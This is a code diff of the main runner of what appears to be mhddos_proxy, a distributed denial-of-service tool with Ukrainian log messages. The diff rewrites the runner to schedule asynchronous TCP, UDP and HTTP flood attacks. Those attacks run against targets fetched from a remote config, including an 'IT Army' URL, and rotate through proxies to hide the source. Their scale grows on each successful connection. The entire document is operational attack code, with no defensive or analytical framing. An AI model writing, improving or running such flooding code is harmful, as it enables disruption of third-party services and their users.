@@ -1,277 +1,419 @@
 # @formatter:off
-import colorama; colorama.init()
+try: import colorama; colorama.init()
+except:raise
 # @formatter:on
-from itertools import cycle
-from queue import SimpleQueue
-import random
+import asyncio
+import sys
 import time
+from functools import partial
 from threading import Event, Thread
-from typing import Any, Generator, List
+from typing import List, Set, Union
 
 from src.cli import init_argparse
-from src.concurrency import DaemonThreadPool
 from src.core import (
-    logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED,
-    DNS_WORKERS, Params, Stats, PADDING_THREADS, ONLY_MY_IP
+    FAILURE_BUDGET_FACTOR, FAILURE_DELAY_SECONDS, IT_ARMY_CONFIG_URL, ONLY_MY_IP, REFRESH_OVERTIME,
+    REFRESH_RATE, SCHEDULER_MIN_INIT_FRACTION, cl, logger
 )
-from src.dns_utils import resolve_all_targets
-from src.mhddos import main as mhddos_main
-from src.output import show_statistic, print_banner, print_progress
-from src.proxies import update_proxies, NoProxy
-from src.system import fix_ulimits, is_latest_version
-from src.targets import Targets
+from src.mhddos import AsyncTcpFlood, AsyncUdpFlood, AttackSettings, main as mhddos_main
+from src.output import print_banner, print_progress, show_statistic
+from src.proxies import ProxySet
+from src.system import WINDOWS_WAKEUP_SECONDS, fix_ulimits, is_latest_version, setup_event_loop
+from src.targets import Target, TargetsLoader
 
 
-def cycle_shuffled(container: List[Any]) -> Generator[Any, None, None]:
-    ind = list(range(len(container)))
-    random.shuffle(ind)
-    for next_ind in cycle(ind):
-        yield container[next_ind]
+class GeminoCurseTaskSet:
 
+    def __init__(
+        self,
+        loop: asyncio.AbstractEventLoop,
+        runnables: List[AsyncTcpFlood],
+        initial_capacity: int = 2,
+        max_capacity: int = 10_000,
+        fork_scale: int = 2,
+        failure_delay: float = 0.25
+    ):
+        self._loop = loop
+        self._tasks = runnables
+        self._initial_capacity = initial_capacity
+        self._max_capacity = max_capacity
+        self._fork_scale = fork_scale
+        self._pending: Set[asyncio.Task] = set()
+        self._failure_delay: float = failure_delay
+        self._shutdown_event: asyncio.Event = asyncio.Event()
 
-class Flooder(Thread):
-    def __init__(self, switch_after: int = WORK_STEALING_DISABLED):
-        super(Flooder, self).__init__(daemon=True)
-        self._switch_after = switch_after
-        self._queue = SimpleQueue()
-
-    def enqueue(self, event, args_list):
-        self._queue.put((event, args_list))
-        return self
-
-    def run(self):
-        """
-        The logic here is the following:
-
-         1) pick up random target to attack
-         2) run a single session, receive back number of packets being sent
-         3) if session was "succesfull" (non zero packets), keep executing for
-            {switch_after} number of cycles
-         4) otherwise, go back to 1)
-
-        The idea is that if a specific target doesn't work, the thread will
-        pick another work to do (steal). The definition of "success" could be
-        extended to cover more use cases.
-
-        As an attempt to steal work happens after fixed number of cycles,
-        one should be careful with the configuration. If each cycle takes too
-        long (for example BYPASS or DBG attacks are used), the number should
-        be set to be relatively small.
-
-        To dealing stealing, set number of cycles to -1. Such scheduling will
-        be equivalent to the scheduling that was used before the feature was
-        introduced (static assignment).
-        """
-        while True:
-            event, args_list = self._queue.get()
-            event.wait()
-            time.sleep(random.random())  # make sure all operations are desynchornized
-            kwargs_iter = cycle_shuffled(args_list)
-            while event.is_set():
-                kwargs = next(kwargs_iter)
-                runnable = mhddos_main(**kwargs)
-                no_switch = self._switch_after == WORK_STEALING_DISABLED
-                alive, cycles_left = True, self._switch_after
-                while event.is_set() and (no_switch or alive):
-                    try:
-                        alive = runnable.run() > 0 and cycles_left > 0
-                    except Exception:
-                        alive = False
-                    cycles_left -= 1
-
-
-def run_flooders(num_threads, switch_after) -> List[Flooder]:
-    threads = []
-    for _ in range(num_threads):
-        flooder = Flooder(switch_after)
+    def _on_connect(self, runnable, f):
         try:
-            flooder.start()
-            threads.append(flooder)
-        except RuntimeError:
-            break
+            if f.result() and len(self) <= self._max_capacity - self._fork_scale:
+                for _ in range(self._fork_scale):
+                    self._launch(runnable)
+        except asyncio.TimeoutError:
+            pass
+        except Exception:
+            pass
 
-    if not threads:
-        logger.error(
-            f'{cl.RED}Не вдалося запустити атаку - вичерпано ліміт потоків системи{cl.RESET}')
-        exit()
+    def _on_finish(self, runnable, f):
+        self._pending.remove(f)
+        try:
+            f.result()
+        except asyncio.CancelledError as e:
+            return
+        except asyncio.TimeoutError:
+            pass
+        except Exception:
+            pass
+        finally:
+            self._launch(runnable)
 
-    if len(threads) < num_threads:
-        logger.warning(
-            f"{cl.RED}Не вдалося запустити усі {num_threads} потоків - "
-            f"лише {len(threads)}{cl.RESET}")
+    def __len__(self) -> int:
+        return len(self._pending)
 
-    return threads
+    def _launch(self, runnable) -> None:
+        if self._shutdown_event.is_set(): return
+        on_connect = self._loop.create_future()
+        on_connect.add_done_callback(partial(self._on_connect, runnable))
+        task = self._loop.create_task(runnable.run(on_connect))
+        task.add_done_callback(partial(self._on_finish, runnable))
+        self._pending.add(task)
+
+    async def loop(self) -> None:
+        # the algo:
+        # 1) for each runnable launch {initial_capacity} tasks
+        # 2) as soon as connection ready on any of them, fork runner
+        #    if max_capacity is enough
+        # 3) on finish, restart corresponding runner
+        #
+        # potential improvement: find a way to downscale
+        assert not self._shutdown_event.is_set(), "Can only be used once"
+        try:
+            for runnable in self._tasks:
+                for _ in range(self._initial_capacity):
+                    self._launch(runnable)
+            while not self._shutdown_event.is_set():
+                await asyncio.sleep(WINDOWS_WAKEUP_SECONDS)
+        except asyncio.CancelledError as e:
+            self._shutdown_event.set()
+            for task in self._pending:
+                task.cancel()
+            raise e
 
 
-def run_ddos(
-    proxies,
-    targets,
-    tcp_flooders,
-    udp_flooders,
-    period,
-    rpc,
-    http_methods,
-    use_my_ip,
-    debug,
-    table,
+async def run_udp_flood(runnable: AsyncUdpFlood) -> None:
+    num_failures = 0
+    while True:
+        try:
+            await runnable.run()
+        except asyncio.CancelledError:
+            raise
+        except Exception:
+            num_failures += 1
+            if num_failures >= FAILURE_BUDGET_FACTOR:
+                await asyncio.sleep(FAILURE_DELAY_SECONDS)
+                num_failures = 0
+
+
+async def run_ddos(
+    proxies: ProxySet,
+    targets_loader: TargetsLoader,
+    attack_settings: AttackSettings,
+    reload_after: int,
+    http_methods: List[str],
+    debug: bool,
+    table: bool,
+    total_threads: int,
+    use_my_ip: int,
+    initial_capacity: int,
+    fork_scale: int,
+    failure_delay: float,
 ):
-    statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []
+    loop = asyncio.get_event_loop()
+    stats = []
+    print_stats = debug or table
 
-    def get_proxy():
-        if use_my_ip == ONLY_MY_IP:
-            return NoProxy
-        if use_my_ip != 0 and random.random() * 100 <= use_my_ip:
-            return NoProxy
-        return random.choice(proxies)
+    # initial set of proxies
+    if proxies.has_proxies:
+        logger.info(f'{cl.YELLOW}Завантажуємо проксі...{cl.RESET}')
+        num_proxies = await proxies.reload()
+        if num_proxies == 0:
+            logger.error(f"{cl.RED}Не знайдено робочих проксі - зупиняємо атаку{cl.RESET}")
+            return
 
-    def register_params(params, container):
-        thread_statistics = Stats()
-        statistics[params] = thread_statistics
+    def prepare_flooder(target: Target, method: str) -> Union[AsyncUdpFlood, AsyncTcpFlood]:
+        target_stats = target.create_stats(method)
+        stats.append(target_stats)
+        if target.has_options:
+            target_rpc = int(target.option(Target.OPTION_RPC, "0"))
+            settings = attack_settings.with_options(
+                requests_per_connection=target_rpc if target_rpc > 0 else None,
+                high_watermark=target.option(Target.OPTION_HIGH_WATERMARK),
+            )
+        else:
+            settings = attack_settings
+
         kwargs = {
-            'url': params.target.url,
-            'ip': params.target.addr,
-            'method': params.method,
-            'rpc': int(params.target.option("rpc", "0")) or rpc,
-            'event': event,
-            'stats': thread_statistics,
-            'get_proxy': get_proxy,
+            'url': target.url,
+            'ip': target.addr,
+            'method': method,
+            'event': None,
+            'stats': target_stats,
+            'proxies': proxies,
+            'loop': loop,
+            'settings': settings,
         }
-        container.append(kwargs)
-        if not (table or debug):
+        if not print_stats:
             logger.info(
                 f'{cl.YELLOW}Атакуємо ціль:{cl.BLUE} %s,{cl.YELLOW} Порт:{cl.BLUE} %s,{cl.YELLOW} Метод:{cl.BLUE} %s{cl.RESET}'
-                % (params.target.url.host, params.target.url.port, params.method)
+                % (target.url.host, target.url.port, method)
             )
+        return mhddos_main(**kwargs)
+
+    active_flooder_tasks = []
+    tcp_task_group = None
+
+    async def install_targets(targets):
+        nonlocal tcp_task_group
+
+        # cancel running flooders
+        if active_flooder_tasks:
+            for task in active_flooder_tasks:
+                task.cancel()
+            active_flooder_tasks.clear()
+
+        stats.clear()
+
+        tcp_flooders, udp_flooders = [], []
+        for target in targets:
+            assert target.is_resolved, "Unresolved target cannot be used for attack"
+            # udp://, method defaults to "UDP"
+            if target.is_udp:
+                udp_flooders.append(prepare_flooder(target, target.method or 'UDP'))
+            # Method is given explicitly
+            elif target.method is not None:
+                tcp_flooders.append(prepare_flooder(target, target.method))
+            # tcp://
+            elif target.url.scheme == "tcp":
+                tcp_flooders.append(prepare_flooder(target, 'TCP'))
+            # HTTP(S), methods from --http-methods
+            elif target.url.scheme in {"http", "https"}:
+                for method in http_methods:
+                    tcp_flooders.append(prepare_flooder(target, method))
+            else:
+                logger.error(f"Unsupported scheme given: {target.url.scheme}")
+
+        if tcp_flooders:
+            num_flooders = len(tcp_flooders)
+            num_init = initial_capacity * num_flooders
+
+            if num_init > total_threads:
+                logger.warning(
+                    f"{cl.MAGENTA}Початкова кількість одночасних атак ({num_init}) перевищує "
+                    f"максимально дозволену параметром `-t` ({total_threads}).{cl.RESET}"
+                )
+
+            # adjust settings to avoid situation when we have just a few
+            # targets in the config (in this case with default CLI settings you are
+            # going to start scaling from 3-15 tasks to 7_500)
+            adjusted_capacity = max(
+                initial_capacity,
+                int(SCHEDULER_MIN_INIT_FRACTION * total_threads / num_flooders)
+            ) if num_flooders > 1 else total_threads
+
+            tcp_task_group = GeminoCurseTaskSet(
+                loop,
+                runnables=tcp_flooders,
+                initial_capacity=adjusted_capacity,
+                max_capacity=total_threads,
+                fork_scale=fork_scale,
+                failure_delay=failure_delay,
+            )
+            task = loop.create_task(tcp_task_group.loop())
+            active_flooder_tasks.append(task)
+        else:
+            tcp_task_group = None
+
+        for flooder in udp_flooders:
+            task = loop.create_task(run_udp_flood(flooder))
+            active_flooder_tasks.append(task)
+
+    try:
+        logger.info(f'{cl.YELLOW}Завантажуємо цілі...{cl.RESET}')
+        initial_targets, _ = await targets_loader.load(resolve=True)
+    except Exception as exc:
+        logger.error(f"{cl.RED}Завантаження цілей завершилося помилкою: {exc}{cl.RESET}")
+        initial_targets = []
+
+    if not initial_targets:
+        logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
+        return
 
     logger.info(f'{cl.GREEN}Запускаємо атаку...{cl.RESET}')
-    if not (table or debug):
+    if not print_stats:
         # Keep the docs/info on-screen for some time before outputting the logger.info above
-        time.sleep(5)
+        await asyncio.sleep(5)
 
-    for target in targets:
-        assert target.is_resolved, "Unresolved target cannot be used for attack"
-        # udp://, method defaults to "UDP"
-        if target.is_udp:
-            register_params(Params(target, target.method or 'UDP'), udp_kwargs_list)
-        # Method is given explicitly
-        elif target.method is not None:
-            register_params(Params(target, target.method), kwargs_list)
-        # tcp://
-        elif target.url.scheme == "tcp":
-            register_params(Params(target, 'TCP'), kwargs_list)
-        # HTTP(S), methods from --http-methods
-        elif target.url.scheme in {"http", "https"}:
-            for method in http_methods:
-                register_params(Params(target, method), kwargs_list)
-        else:
-            raise ValueError(f"Unsupported scheme given: {target.url.scheme}")
+    await install_targets(initial_targets)
 
-    for flooder in tcp_flooders:
-        flooder.enqueue(event, kwargs_list)
+    tasks = []
 
-    if udp_kwargs_list:
-        for flooder in udp_flooders:
-            flooder.enqueue(event, udp_kwargs_list)
-
-    event.set()
-
-    if not (table or debug):
-        print_progress(period, len(proxies), use_my_ip)
-        time.sleep(period)
-    else:
+    async def stats_printer():
         cycle_start = time.perf_counter()
         while True:
-            time.sleep(5)
-            passed = time.perf_counter() - cycle_start
-            if passed > period:
-                break
-            show_statistic(statistics, table, use_my_ip, len(proxies), round(period - passed))
+            await asyncio.sleep(REFRESH_RATE)
+            try:
+                passed = time.perf_counter() - cycle_start
+                num_proxies = len(proxies)
+                show_statistic(
+                    stats,
+                    table,
+                    use_my_ip,
+                    num_proxies,
+                    passed > REFRESH_RATE * REFRESH_OVERTIME,
+                )
+                if tcp_task_group is not None:
+                    logger.debug(f"Task group size: {len(tcp_task_group)}")
+            finally:
+                cycle_start = time.perf_counter()
 
-    event.clear()
+    # setup coroutine to print stats
+    if print_stats:
+        tasks.append(loop.create_task(stats_printer()))
+    else:
+        print_progress(len(proxies), use_my_ip, False)
+
+    async def reload_targets(delay_seconds: int = 30):
+        while True:
+            try:
+                await asyncio.sleep(delay_seconds)
+                targets, changed = await targets_loader.load(resolve=True)
+                if changed and not targets:
+                    logger.warning(
+                        f"{cl.MAGENTA}Завантажено порожній конфіг - буде використано попередній{cl.RESET}"
+                    )
+                else:
+                    await install_targets(targets)
+            except asyncio.CancelledError as e:
+                raise e
+            except Exception as exc:
+                logger.warning(f"{cl.MAGENTA}Не вдалося (пере)завантажити конфіг цілей: {exc}{cl.RESET}")
+
+    # setup coroutine to reload targets
+    tasks.append(loop.create_task(reload_targets(delay_seconds=reload_after)))
+
+    async def reload_proxies(delay_seconds: int = 30):
+        while True:
+            try:
+                await asyncio.sleep(delay_seconds)
+                if (await proxies.reload()) == 0:
+                    logger.warning(
+                        f"{cl.MAGENTA}Не вдалося перезавантажити список проксі - буде використано попередній{cl.RESET}"
+                    )
+
+            except asyncio.CancelledError:
+                raise
+            except Exception:
+                pass
+
+    # setup coroutine to reload proxies
+    if proxies.has_proxies:
+        tasks.append(loop.create_task(reload_proxies(delay_seconds=reload_after)))
+
+    await asyncio.gather(*tasks, return_exceptions=True)
 
 
-def start(args):
+async def start(args, shutdown_event: Event):
     use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
     print_banner(use_my_ip)
-    fix_ulimits()
+    max_conns = fix_ulimits()
 
     if args.table:
         args.debug = False
 
-    for bypass in ('CFB', 'DGB'):
-        if bypass in args.http_methods:
-            logger.warning(f'{cl.RED}Робота методу {bypass} не гарантована{cl.RESET}')
+    is_old_version = not await is_latest_version()
+    if is_old_version:
+        logger.warning(
+            f"{cl.RED}Доступна нова версія - рекомендовано оновитися{cl.RESET}: "
+            "https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n"
+        )
 
     if args.itarmy:
-        targets_iter = Targets([], IT_ARMY_CONFIG_URL)
+        targets_loader = TargetsLoader([], IT_ARMY_CONFIG_URL)
     else:
-        targets_iter = Targets(args.targets, args.config)
+        targets_loader = TargetsLoader(args.targets, args.config)
 
-    proxies = []
-    is_old_version = not is_latest_version()
+    # we are going to fetch proxies even in case we have only UDP
+    # targets because the list of targets might change at any point in time
+    proxies = ProxySet(args.proxies, use_my_ip)
 
-    # padding threads are necessary to create a "safety buffer" for the
-    # system that hit resources limitation when running main pools.
-    # it will be deallocated as soon as all other threads are up and running.
-    padding_threads = DaemonThreadPool(PADDING_THREADS).start_all()
-    dns_executor = DaemonThreadPool(DNS_WORKERS).start_all()
-    udp_flooders = run_flooders(args.udp_threads, WORK_STEALING_DISABLED)
-    tcp_flooders = run_flooders(args.threads, args.switch_after)
-    padding_threads.terminate_all()
-    del padding_threads
+    attack_settings = AttackSettings(
+        requests_per_connection=args.rpc,
+        dest_connect_timeout_seconds=10.0,
+        drain_timeout_seconds=10.0,
+        high_watermark=1024 << 4,
+        # note that "generic flood" attacks switch reading off completely
+        reader_limit=1024 << 2,
+        socket_rcvbuf=1024 << 2,
+    )
 
-    while True:
-        if is_old_version:
-            print(
-                f'{cl.RED}! ЗАПУЩЕНА НЕ ОСТАННЯ ВЕРСІЯ - ОНОВІТЬСЯ{cl.RESET}: https://telegra.ph/Onovlennya-mhddos-proxy-04-16\n')
-
-        while True:
-            targets = list(targets_iter)
-            if not targets:
-                logger.error(f'{cl.RED}Не вказано жодної цілі для атаки{cl.RESET}')
-                exit()
-
-            targets = resolve_all_targets(targets, dns_executor)
-            targets = [target for target in targets if target.is_resolved]
-            if targets:
-                break
-            else:
-                logger.warning(
-                    f'{cl.RED}Не знайдено жодної доступної цілі - чекаємо 30 сек до наступної перевірки{cl.RESET}')
-                time.sleep(30)
-
-        if args.rpc < LOW_RPC:
+    # XXX: with the current implementation there's no need to
+    # have 2 separate functions to setups params for launching flooders
+    reload_after = 300
+    connections = args.threads
+    if max_conns is not None:
+        max_conns -= 50  # keep some for other needs
+        if max_conns < connections:
             logger.warning(
-                f'{cl.YELLOW}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності '
-                f'через збільшення кількості перепідключень{cl.RESET}'
+                f"{cl.MAGENTA}Кількість потоків зменшено до {max_conns} через обмеження вашої системи{cl.RESET}"
             )
+            connections = max_conns
 
-        current_use_my_ip = use_my_ip
-        if all(target.is_udp for target in targets):
-            current_use_my_ip = ONLY_MY_IP
+    await run_ddos(
+        proxies,
+        targets_loader,
+        attack_settings,
+        reload_after,
+        args.http_methods,
+        args.debug,
+        args.table,
+        connections,
+        use_my_ip,
+        args.scheduler_initial_capacity,
+        args.scheduler_fork_scale,
+        args.scheduler_failure_delay,
+    )
+    shutdown_event.set()
 
-        if current_use_my_ip == ONLY_MY_IP:
-            proxies = []
-        else:
-            proxies = list(update_proxies(args.proxies, proxies))
 
-        period = 300
-        run_ddos(
-            proxies,
-            targets,
-            tcp_flooders,
-            udp_flooders,
-            period,
-            args.rpc,
-            args.http_methods,
-            current_use_my_ip,
-            args.debug,
-            args.table,
+def _main(args, shutdown_event, uvloop):
+    loop = setup_event_loop(uvloop)
+    loop.run_until_complete(start(args, shutdown_event))
+
+
+def main():
+    args = init_argparse().parse_args()
+
+    uvloop = False
+    try:
+        __import__("uvloop").install()
+        uvloop = True
+        logger.info(
+            f"{cl.GREEN}'uvloop' успішно активований "
+            f"(підвищенна ефективність роботи з мережею){cl.RESET}"
         )
+    except:
+        pass
+
+    shutdown_event = Event()
+    try:
+        # run event loop in a separate thread to ensure the application
+        # exits immediately after Ctrl+C
+        Thread(target=_main, args=[args, shutdown_event, uvloop], daemon=True).start()
+        # we can do something smarter rather than waiting forever,
+        # but as of now it's gonna be consistent with previous version
+        while not shutdown_event.wait(WINDOWS_WAKEUP_SECONDS):
+            continue
+    except KeyboardInterrupt:
+        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
+        sys.exit()
 
 
 if __name__ == '__main__':
-    try:
-        start(init_argparse().parse_args())
-    except KeyboardInterrupt:
-        logger.info(f'{cl.BLUE}Завершуємо роботу...{cl.RESET}')
+    main()
